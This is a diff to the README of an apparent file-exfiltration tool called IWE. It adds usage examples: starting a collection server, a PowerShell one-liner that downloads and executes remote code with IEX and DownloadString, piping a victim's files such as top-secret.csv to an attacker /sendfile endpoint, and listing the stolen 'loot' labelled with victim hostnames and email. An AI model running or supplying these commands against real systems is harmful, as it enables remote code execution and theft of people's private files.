@@ -145,8 +145,7 @@ pip install -r requirements.txt
 ```
 
 # Usage & Examples
-
-## Start the server
+Server
 ```bash
 $ ./iwe-server.py --address hackerman1337.net --port 8443
 
@@ -179,9 +178,23 @@ WARNING: This is a development server. Do not use it in a production deployment.
  * Running on https://172.30.140.67:8443
 Press CTRL+C to quit
 ```
-
+Client
 ```powershell
-
+PS > IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.102:8000/iwe')
+PS > ls file* | IWE
+[~] Target server: 'http://192.168.20.102:8000/sendfile'
+[*] Password: ********
+[+] Exfiltrating file 'C:\Users\victim\file.bin'
+[+] Exfiltrating file 'C:\Users\victim\top-secret.csv'
+[+] Exfiltrating file 'C:\Users\victim\dont-share.docx'
+[~] All done!
+```
+Server 
+```bash
+$ find ./loot/ -type f
+loot/192.168.20.102_VICTIM-PC-HOSTNAME_Microsoft_Windows_11_Pro_10.0.22000_user@domain.com/C/Users/victim/file.bin
+loot/192.168.20.102_VICTIM-PC-HOSTNAME_Microsoft_Windows_11_Pro_10.0.22000_user@domain.com/C/Users/victim/top-secret.csv
+loot/192.168.20.102_VICTIM-PC-HOSTNAME_Microsoft_Windows_11_Pro_10.0.22000_user@domain.com/C/Users/victim/dont-share.docx
 ```
 
 ## Load `IWE` into PowerShell 
